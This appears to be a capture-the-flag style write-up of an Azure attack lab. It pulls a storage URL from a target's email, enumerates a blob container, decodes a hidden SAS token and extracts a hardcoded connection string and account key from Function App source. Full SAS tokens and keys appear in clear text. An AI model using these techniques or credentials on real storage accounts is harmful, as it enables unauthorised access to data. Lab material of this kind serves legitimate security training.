# Attack Lab 26


```
− Gain access to a Storage Account by leveraging SAS Token by leveraging the information extracted from the inbox of Marie Williams.
− Read the Source Code of the Function App from the Azure Files and extract the connection string for Storage Account.
```

Try to access to the email link found on Marie email:

```
Dear Marie,

Your documents are uploaded and approved. You can find the documents here - https://billingprocessorstg.blob.core.windows.net/mariewilliams

In case of any changes, please upload the documents again and submit a new request.


Regards,
```
Web access:
```
<Error>
<Code>ResourceNotFound</Code>
<Message>The specified resource does not exist. RequestId:f0bab61d-501e-0012-22b5-fd1bc6000000 Time:2023-10-13T09:15:08.8791151Z</Message>
</Error>
```
With additional querystring parameters:

```
https://billingprocessorstg.blob.core.windows.net/mariewilliams?restype=container&comp=list
```
Response
```
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<EnumerationResults ContainerName="https://billingprocessorstg.blob.core.windows.net/mariewilliams">
<Blobs>
<Blob>
<Name>mapped.xml</Name>
<Url>https://billingprocessorstg.blob.core.windows.net/mariewilliams/mapped.xml</Url>
<Properties>
<Last-Modified>Wed, 11 Oct 2023 11:20:39 GMT</Last-Modified>
<Etag>0x8DBCA4C199BB41B</Etag>
<Content-Length>411</Content-Length>
<Content-Type>text/xml</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>1Rbf9T4TjgxZDumuVadM2w==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
</Blobs>
<NextMarker/>
</EnumerationResults>
```
Mapped.xml for API endpoint:
``

https://billingprocessorstg.blob.core.windows.net/mariewilliams/mapped.xml
```
Response:
```
<FileShare>
<Name>billingprocessor9a71</Name>
<Url>https://billingprocessorstg.file.core.windows.net/billingprocessor9a71</Url>
<Properties>
<Content>P3N2PTIwMjItMTEtMDImc3M9ZiZzcnQ9c2NvJnNwPXJsJnNlPTIwMjQtMDItMjlUMjA6MTc6NDZaJnN0PTIwMjMtMTAtMDFUMTE6MTc6NDZaJnNwcj1odHRwcyZzaWc9Um41SWV5eE0zSVZ6ckRTNTFPOHlQYTB0WmY3QzZWOEFvUm81TE5ScllOayUzRA==</Content>
</Properties>
</FileShare>
```

complete urld etected:
```
f0ns1@f0ns1-msi:~$ echo "P3N2PTIwMjItMTEtMDImc3M9ZiZzcnQ9c2NvJnNwPXJsJnNlPTIwMjQtMDItMjlUMjA6MTc6NDZaJnN0PTIwMjMtMTAtMDFUMTE6MTc6NDZaJnNwcj1odHRwcyZzaWc9Um41SWV5eE0zSVZ6ckRTNTFPOHlQYTB0WmY3QzZWOEFvUm81TE5ScllOayUzRA==" | base64 -d
?sv=2022-11-02&ss=f&srt=sco&sp=rl&se=2024-02-29T20:17:46Z&st=2023-10-01T11:17:46Z&spr=https&sig=Rn5IeyxM3IVzrDS51O8yPa0tZf7C6V8AoRo5LNRrYNk%3Df0ns1@f0ns1-msi:~$ 

https://billingprocessorstg.file.core.windows.net/billingprocessor9a71?sv=2022-11-02&ss=f&srt=sco&sp=rl&se=2024-02-29T20:17:46Z&st=2023-10-01T11:17:46Z&spr=https&sig=Rn5IeyxM3IVzrDS51O8yPa0tZf7C6V8AoRo5LNRrYNk%3D
```
Using Azure FIle connector Software:
_init_.py
```
import logging

import azure.functions as func


def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')

    connection_string = "https://phcbillingstorage.blob.core.windows.net/?sv=2022-11-02&ss=b&srt=sco&sp=rltfx&se=2024-03-29T20:32:05Z&st=2023-10-01T12:32:05Z&spr=https&sig=pCWp4V0bad2eao9hXvcddvu5bpttA%2F45tm%2FAqC66vJo%3D"
    from azure.storage.blob import BlobServiceClient
    blob_service_client = BlobServiceClient.from_connection_string(self.connection_string)

    # Get account information for the Blob Service
    account_info = blob_service_client.get_account_information()

    return func.HttpResponse(f"{account_info}")

```
config.json
```
{
  "bindings": [
    {
      "authLevel": "function",
      "type": "httpTrigger",
      "direction": "in",
      "name": "req",
      "methods": [
        "get",
        "post"
      ]
    },
    {
      "type": "http",
      "direction": "out",
      "name": "$return"
    }
  ]
}
```
hosts.json:
```
{
  "version": "2.0",
  "extensionBundle": {
    "id": "Microsoft.Azure.Functions.ExtensionBundle",
    "version": "[2.*, 3.0.0)"
  }
}
```
Primary key:
```
Eby8vdM02xNOcqFlqUwJPLlmEtlCDXJ1OUzFT50uSRZ6IFsuFq2UVErCz4I6tq/K1SZFPTOtr/KBHBeksoGMGw==
```
Primary connection String:
```
AccountName=devstoreaccount1;AccountKey=Eby8vdM02xNOcqFlqUwJPLlmEtlCDXJ1OUzFT50uSRZ6IFsuFq2UVErCz4I6tq/K1SZFPTOtr/KBHBeksoGMGw==;DefaultEndpointsProtocol=http;BlobEndpoint=http://127.0.0.1:10000/devstoreaccount1;QueueEndpoint=http://127.0.0.1:10001/devstoreaccount1;TableEndpoint=http://127.0.0.1:10002/devstoreaccount1;
```
Permissinos:
```
Full
```
